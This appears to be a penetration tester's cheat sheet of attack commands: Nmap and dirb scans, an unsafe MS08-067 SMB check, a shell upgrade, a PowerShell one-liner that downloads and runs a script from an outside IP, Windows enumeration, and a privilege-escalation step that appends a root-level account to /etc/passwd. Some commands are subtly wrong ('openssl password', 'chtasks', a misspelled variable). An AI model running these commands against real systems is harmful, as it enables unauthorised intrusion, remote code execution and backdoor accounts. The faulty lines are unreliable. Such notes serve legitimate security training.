# Nmap
sudo nmap -O -sS -p- "$target"
sudo nmap -sU -p- "$target"
sudo nmap -sC -sV "$target"
sudo nmap -O -sS -p- "$target" | tee synscan.txt && sudo nmap -sC -sV "$target" | tee scriptscan.txt && sudo nmap -sU -p- "$target" | tee udpscan.txt

# Sudo
sudo -l

# Dirb
dirb "http://$target" -r -z 10

# SMB
sudo nbtscan -r "$target"
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 "$target"

# Upgrading Shell
python -c 'import pty; pty.spawn("/bin/bash")'

# Powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
Also check out 16.2.3 for base64 executable transfer and execution

# Windows Priv Esc
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
net user [username]
ipconfig /all 
tasklist /SVC **all running proccesses**
route print **all routes**
netstat -ano  **all active tcp connections**
netsh advfirewall show currentprofile **current firewall settings**
chtasks /query /fo LIST /v **scheduled tasks**
wmic product get name, version, vendor **installed software**
wmic qfe get Caption, Description, HotFixID, InstalledOn **installed version**

# Linux Priv Esc
openssl password "$pasword" **generate password hash for $password**
echo "root2:$hash:0:0:root:/root:/bin/bash" >> /etc/passwd

